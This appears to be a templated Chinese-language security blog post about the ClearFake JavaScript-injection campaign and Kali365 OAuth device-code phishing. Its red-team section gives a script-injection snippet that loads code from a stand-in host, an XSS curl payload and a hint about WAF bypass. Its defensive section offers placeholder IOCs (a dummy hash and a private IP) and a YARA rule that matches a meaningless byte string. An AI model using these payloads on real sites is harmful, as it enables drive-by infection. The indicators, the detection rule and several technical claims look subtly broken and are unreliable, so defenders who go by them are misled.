---
layout: post
title:  "Intelligence Insights: June 2026"
date:   2026-06-18 20:15:45 +0000
categories: [security]
severity: high
---

# 🔥 解析 ClearFake 和 Kali365 威脅：JavaScript 注入與 OAuth 設備代碼釣魚
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak
> * **關鍵技術**: JavaScript 注入、OAuth 設備代碼釣魚、Drive-by Download

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: ClearFake 利用 JavaScript 注入技術將惡意代碼注入受駭網站，從而實現 Drive-by Download。Kali365 則利用 OAuth 設備代碼釣魚技術，欺騙用戶授權惡意應用程序。
* **攻擊流程圖解**:
  1. 用戶訪問受駭網站。
  2. 網站注入惡意 JavaScript 代碼。
  3. 代碼執行，彈出假的 CAPTCHA 頁面。
  4. 用戶輸入驗證碼，實際上是執行惡意代碼。
  5. 惡意代碼下載並執行惡意軟件。
* **受影響元件**: 所有使用 JavaScript 的網站和應用程序。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 受駭網站、JavaScript 注入技術。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意 JavaScript 代碼
    var script = document.createElement('script');
    script.src = 'https://example.com/malicious.js';
    document.body.appendChild(script);
    
    ```
* **範例指令**:

    ```
    
    bash
    curl -X POST \
      https://example.com/vulnerable-page \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      -d 'user_input=<script>alert("XSS")</script>'
    
    ```
* **繞過技術**: 可以使用 WAF 繞過技術，例如使用 Base64 編碼。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /malicious.js |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule ClearFake {
      meta:
        description = "ClearFake 惡意代碼"
      strings:
        $script = { 28 29 2f 2a 20 53 63 72 69 70 74 20 74 61 67 20 2a 2f 20 }
      condition:
        $script at 0
    }
    
    ```
* **緩解措施**: 更新網站代碼，使用安全的 JavaScript 函數，例如 `DOMPurify`。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **JavaScript 注入 (JavaScript Injection)**: 惡意代碼注入網站的 JavaScript 代碼中，從而實現惡意行為。
* **OAuth 設備代碼釣魚 (OAuth Device Code Phishing)**: 欺騙用戶授權惡意應用程序，從而實現惡意行為。
* **Drive-by Download (Drive-by Download)**: 惡意軟件下載並執行，無需用戶交互。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1189/)


